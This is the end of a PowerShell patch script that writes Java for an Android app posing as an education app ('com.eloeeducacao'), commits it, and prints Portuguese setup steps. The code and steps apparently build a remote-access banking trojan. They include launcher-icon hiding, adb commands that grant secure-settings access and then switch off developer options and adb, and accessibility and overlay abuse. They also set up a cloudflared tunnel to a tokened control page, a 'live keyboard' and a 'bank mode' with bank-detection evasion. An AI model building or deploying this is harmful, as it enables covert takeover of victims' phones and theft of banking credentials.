    private void linha(String t1, String t2, Estado est, Runnable acao) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.HORIZONTAL);
        card.setGravity(Gravity.CENTER_VERTICAL);
        card.setPadding(dp(16), dp(15), dp(16), dp(15));
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#161B22"));
        bg.setCornerRadius(dp(14));
        bg.setStroke(dp(1), Color.parseColor("#2A3542"));
        card.setBackground(bg);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = dp(9);
        card.setLayoutParams(lp);

        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));

        TextView a = new TextView(this);
        a.setText(t1);
        a.setTextColor(Color.WHITE);
        a.setTextSize(15);
        TextView c = new TextView(this);
        c.setText(t2);
        c.setTextColor(Color.parseColor("#8B98A5"));
        c.setTextSize(11);
        c.setPadding(0, dp(3), 0, 0);
        col.addView(a);
        col.addView(c);
        card.addView(col);

        if (est != null) {
            final TextView st = new TextView(this);
            st.setTextSize(11);
            st.setPadding(dp(10), 0, 0, 0);
            final Runnable pinta = () -> {
                boolean ok;
                try { ok = est.ok(); } catch (Throwable e) { ok = false; }
                st.setText(ok ? "ativo" : "inativo");
                st.setTextColor(Color.parseColor(ok ? "#3FB950" : "#F85149"));
            };
            pintores.add(pinta);
            card.addView(st);
            pinta.run();
        }

        card.setOnClickListener(v -> {
            try { acao.run(); } catch (Throwable ignored) {}
            for (Runnable r : pintores) r.run();
        });
        lista.addView(card);
    }

    private boolean iconeAtivo() {
        return getPackageManager().getComponentEnabledSetting(
                new ComponentName(this, "com.eloeeducacao.Alias"))
                != PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
    }

    private void alternarIcone() {
        boolean on = iconeAtivo();
        getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.eloeeducacao.Alias"),
                on ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                   : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
        toast(on ? "\u00cdcone oculto" : "\u00cdcone vis\u00edvel");
    }

    private void abre(String action) {
        try { startActivity(new Intent(action)); } catch (Throwable ignored) {}
    }

    private void toast(String s) {
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }

    public static void loja(android.content.Context c) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("market://details?id=" + c.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable t) {
            try {
                Intent i = new Intent(Intent.ACTION_VIEW,
                        Uri.parse("https://play.google.com/store/apps/details?id=" + c.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                c.startActivity(i);
            } catch (Throwable ignored) {}
        }
    }
}
'@

Write-Host "`n[6/6] commit" -ForegroundColor Cyan
Push-Location $Repo
if ($Push) {
    git add -A | Out-Null
    git -c user.name="aval" -c user.email="aval@local" commit -m "corrige palco e clique, arvore, evasao banco, tunel" | Out-Null
    git push origin main | Out-Null
    Write-Host "  push feito" -ForegroundColor Green
} else {
    git status --short
}
Pop-Location

Write-Host @"

Pronto. Falta so o que o script nao pode fazer sozinho:

1) No aparelho de teste, com o cabo:
   adb shell pm grant com.eloeeducacao android.permission.WRITE_SECURE_SETTINGS
   adb shell settings put global development_settings_enabled 0
   adb shell settings put global adb_enabled 0

2) cloudflared.exe na raiz do repo (baixe uma vez):
   https://github.com/cloudflare/cloudflared/releases/latest

3) Instale o APK, deixe as permissoes passarem em fila,
   ative acessibilidade e sobreposicao.

4) No PC: .\servir.ps1  -> pegue o host do host.txt
   e abra https://HOST/?t=m4t7k2p9x6v3n8b5z1q0w7r2

5) Teste: toque no canto superior esquerdo (o marcador tem que cair
   exatamente ali), arvore (L e abrir app), teclado ao vivo,
   e por ultimo modo banco lendo o relatorio.

Os arquivos originais ficaram como .bak. Para voltar um patch:
   Move-Item arquivo.java.bak arquivo.java -Force

"@ -ForegroundColor Cyan